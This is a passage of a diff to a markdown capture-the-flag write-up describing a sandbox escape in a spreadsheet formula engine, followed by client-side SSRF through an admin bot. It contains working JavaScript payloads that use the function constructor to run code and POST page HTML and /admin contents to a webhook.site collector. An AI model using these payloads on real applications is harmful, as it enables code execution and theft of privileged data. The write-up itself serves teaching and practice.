@@ -38,27 +38,33 @@ Attempts to call global functions like `=fetch()` or access `window.location` re
 ## Step 2 — Sandbox Escape
 
 To break out of the sandbox and access the global scope, we used the classic trick of accessing the global function constructor through the prototypes of basic data types:
-
+```
 javascript
 =(1).constructor.constructor("YOUR_CODE_HERE")()
+```
+
 This approach allows the creation of a new function outside the restricted sandbox environment. A test payload confirmed full Remote Code Execution (RCE) within the context of the browser tab.
 
 ## Step 3 — Bot SSRF and HttpOnly Bypass
 The next logical step was stealing the admin's document.cookie. However, the cookies were protected by the HttpOnly flag and remained inaccessible to JavaScript.
 
 Since we can execute code as the admin, we decided to exfiltrate the entire HTML of the page to see what the moderator sees:
-
+```
 JavaScript
 =(1).constructor.constructor("return fetch('[https://webhook.site/YOUR_ID/](https://webhook.site/YOUR_ID/)', {method: 'POST', body: document.documentElement.innerHTML})")()
+```
+
 The exfiltrated HTML revealed a hidden navigation element: <a href="/admin">Admin ▸</a>.
 
 ## Step 4 — Data Exfiltration
 The final attack vector (Client-Side SSRF) involved forcing the bot's browser to request the /admin page, read the response, and send it to our server.
 
 To ensure the spreadsheet saves the formula correctly without crashing during the asynchronous fetch, we added return 1 at the end:
-
+```
 JavaScript
 =(1).constructor.constructor("fetch('/admin').then(r=>r.text()).then(html=>fetch('[https://webhook.site/YOUR_ID/](https://webhook.site/YOUR_ID/)',{method:'POST',body:html}));return 1")()
+```
+
 After submitting the sheetId to the bot, a POST request arrived at our webhook containing the full content of the admin panel and the "Master flag".
 
 ## Flag
